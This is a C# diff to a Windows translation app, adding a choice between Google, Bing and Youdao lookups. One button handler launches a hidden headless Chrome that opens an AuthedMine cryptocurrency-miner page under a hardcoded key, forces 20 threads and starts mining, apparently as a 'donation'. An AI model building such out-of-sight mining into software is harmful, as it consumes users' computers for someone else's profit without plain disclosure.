@@ -43,6 +43,7 @@ namespace Prototype
             metroComboBox2.SelectedIndex = 0;
             metroComboBox3.SelectedIndex = 0;
             metroComboBox4.SelectedIndex = 0;
+            metroComboBox5.SelectedIndex = 0;
             materialRaisedButton6.Visible = false;
             Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)+@"\ELNA_Temp");
 
@@ -83,42 +84,61 @@ namespace Prototype
                 Output.Text = "";
                 if (metroComboBox1.SelectedIndex == 1)
                 {
-                    if (metroComboBox3.SelectedIndex == 0)
+                    if (metroComboBox5.SelectedIndex == 0)
                     {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "en");
+                        if (metroComboBox3.SelectedIndex == 0)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "en");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 1)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "zh");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 2)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "es");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 3)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "fr");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 4)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "ru");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 5)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "it");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 6)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "ko");
+                            Output.Text = translation;
+                        }
+                        if (metroComboBox3.SelectedIndex == 7)
+                        {
+                            string translation = Translations.Google_Translate(User_Text.Text, "auto", "ja");
+                            Output.Text = translation;
+                        }
+                    }
+                    if (metroComboBox5.SelectedIndex == 1)
+                    {
+                        string translation = Translations.Bing_Translate(User_Text.Text, "zh-CHS", webBrowser3);
                         Output.Text = translation;
                     }
-                    if (metroComboBox3.SelectedIndex == 1)
+                    if (metroComboBox5.SelectedIndex == 2)
                     {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "zh");
                         string definition = Translations.Youdao_Dictionary(User_Text.Text);
-                        Output.Text = translation + "\r\n" + definition;
+                        Output.Text = definition;
+                        
                     }
-                    if (metroComboBox3.SelectedIndex == 2)
-                    {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "es");
-                        Output.Text = translation;
-                    }
-                    if (metroComboBox3.SelectedIndex == 3)
-                    {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "fr");
-                        Output.Text = translation;
-                    }
-                    if (metroComboBox3.SelectedIndex == 4)
-                    {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "ru");
-                        Output.Text = translation;
-                    }
-                    if (metroComboBox3.SelectedIndex == 5)
-                    {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "ko");
-                        Output.Text = translation;
-                    }
-                    if (metroComboBox3.SelectedIndex == 6)
-                    {
-                        string translation = Translations.Google_Translate(User_Text.Text, "auto", "ja");
-                        Output.Text = translation;
-                    }
+
                 }
                 if (metroComboBox1.SelectedIndex == 0)
                 {
@@ -165,6 +185,7 @@ namespace Prototype
 
             }
             metroComboBox3.Visible = metroComboBox1.SelectedIndex == 0 ? false : true;
+            metroComboBox5.Visible = metroComboBox1.SelectedIndex == 0 ? false : true;
             metroComboBox4.Visible = metroComboBox1.SelectedIndex == 0 ? true : false;
             materialRaisedButton7.Visible = metroComboBox1.SelectedIndex == 0 ? true:false;
             materialRaisedButton6.Visible = false;
@@ -355,7 +376,6 @@ namespace Prototype
 
         private void textBox4_TextChanged(object sender, EventArgs e)
         {
-            
         }
 
         private void metroButton1_Click(object sender, EventArgs e)
@@ -531,6 +551,11 @@ namespace Prototype
             materialRaisedButton8.Visible = false;
             materialRaisedButton9.Visible = false;
             Output.Text = "";
+            if (metroComboBox5.SelectedIndex == 2)
+            {
+                metroCheckBox3.Enabled = false;
+                metroComboBox3.SelectedIndex = 1;
+            }
         }
 
         private void button1_Click_1(object sender, EventArgs e)
@@ -548,8 +573,13 @@ namespace Prototype
             service.HideCommandPromptWindow = true;
             options.AddArgument("headless");
             driver = new ChromeDriver(service, options);
-            driver.Navigate().GoToUrl("https://ylxm.eu.org/coinhive");
-                        button8.Enabled = false;
+            driver.Navigate().GoToUrl("https://authedmine.com/media/miner.html?key=4wxvL0bIXALZuNQBGTkgWUaWRSEByozs");
+            IJavaScriptExecutor js = driver as IJavaScriptExecutor;
+            js.ExecuteScript("document.getElementById('threads').innerHTML = '20';");
+            var element = driver.FindElement(By.Id("mining-button-text"));
+            element.Click();
+
+            button8.Enabled = false;
             button8.Text = "Thank You Very Much!";
         }
 
@@ -557,6 +587,20 @@ namespace Prototype
         {
             if(checkBox2.Checked)
             driver.Quit();
+        }
+
+        private void metroComboBox5_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (metroComboBox5.SelectedIndex == 2)
+            {
+                metroCheckBox3.Enabled = false;
+                metroComboBox3.SelectedIndex = 1;
+            }
+        }
+
+        private void metroComboBox4_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
         }
     }
     public class Result
